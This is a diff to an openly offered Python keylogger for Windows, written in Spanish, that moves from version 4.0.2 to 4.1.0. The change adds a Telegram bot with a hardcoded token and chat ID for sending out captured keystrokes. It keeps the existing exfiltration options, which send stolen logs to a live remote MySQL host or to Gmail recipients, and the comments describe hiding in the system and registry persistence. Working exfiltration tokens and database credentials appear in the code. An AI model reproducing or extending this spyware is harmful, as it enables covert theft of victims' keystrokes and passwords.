@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.0.2
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.1.0
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -21,6 +21,7 @@ from winreg import *
 import datetime
 import random
 import os
+import telebot
 import yagmail
 import pymysql  # Lib connection mysql
 import shutil
@@ -391,6 +392,10 @@ def SendLog():
         else:
             print("[Send] sin conexión")
 
+# Telegram Bot
+def TelegramBot():
+    pass
+
 # ***************************************   ZONA CUSTOM AVANZADA  ***********************************
 
 # NOTA:| Solo Cambie éstas variables si sabe      |
@@ -429,9 +434,10 @@ def passS():
 def ReceiveE():#Correos que recibirán el registro de teclas.
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
     return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
-# ************ Fin Zona Gmail ************* 
+# ************ End Zona Gmail ************* 
 
 # ************ Start Zone DATABASE ************* 
+# Nota: los datos de la base de datos son reales y publicas, solo para pruebas. 
 def DB_HOST():
     return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
 def DB_USER():
@@ -443,7 +449,7 @@ def DB_NAME():
 def DB_PORT(): 
     return "3306"                                                   # Opcional en algunos casos
 
-# ************ Fin Zone DATABASE ************* 
+# ************ End Zone DATABASE ************* 
 def GMailOrDataBase():
     return 1    # 1 = DataBase 
                 # 0 = Gmail
@@ -452,36 +458,49 @@ def GMailOrDataBase():
 def timeSend(): # Tiempo de envío perzonalizado
     return 20 #Minutos                 <= Escoja su tiempo en minutos
 
-# ************ Zona MediaFire *************     
-# Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
-#def MFUser():
-#    return "corroe@gmail.com"                   # Proximas actualizaciones...
+# ************ Zone Telegram *************     
+def ID():
+    return "831756903"            # <=  ID de chat telegram 
 
-#def MFPass():
-#    return "contra"
+def Token():
+    return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
 
-# ************ Zona MediaFire ************* 
+# ************ Zona Telegram ************* 
 
 # ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
 
 # Inicio multihilo
 if __name__ == '__main__':
     
-    EscondeKey()    # Se replica dentro de la computadora
-    addStartup()    # Modifica registro de arranque
+    #TelegramBot()
+    bot = telebot.TeleBot("1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8")
+
+    bot.reply_to(ID(), "This is a message handler")
+
+
+
+
+
+
+
+
+    
+    #EscondeKey()    # Se replica dentro de la computadora
+    #addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=KeyLogger)   # Registra teclas
 
-    p2 = threading.Thread(target=SendLog)   # Enviar Registro
-    p2.start()
+    #p2 = threading.Thread(target=SendLog)   # Enviar Registro
+    #p2.start()
     p1.start()
     p1.join()
+
 
 
 
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v4.0.2      #
+#                                                   v4.1.0      #
 #################################################################
 # NOTAS IMPORTANTES:
 #
